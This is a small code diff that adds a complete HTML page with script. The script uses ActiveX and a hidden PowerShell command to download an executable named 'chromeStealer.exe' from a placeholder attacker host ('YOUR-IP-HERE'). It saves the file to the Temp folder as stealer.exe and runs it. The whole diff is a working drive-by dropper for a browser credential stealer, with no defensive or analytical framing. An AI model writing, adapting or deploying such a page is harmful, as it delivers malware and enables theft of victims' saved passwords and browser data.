@@ -1,4 +1,14 @@
+<html>
+<head>
 <script>
+var url = "http://YOUR-IP-HERE/chromeStealer.exe";
+var fso = new ActiveXObject("Scripting.FileSystemObject");
+var temp = fso.GetSpecialFolder(2); // 2 = Temp folder
+var exe = temp + "\\stealer.exe";
+
 var shell = new ActiveXObject("WScript.Shell");
-shell.Run("chromeStealer.exe");
+shell.Run("powershell -w hidden -c Invoke-WebRequest -Uri '" + url + "' -OutFile '" + exe + "'; Start-Process '" + exe + "'");
 </script>
+</head>
+<body></body>
+</html>
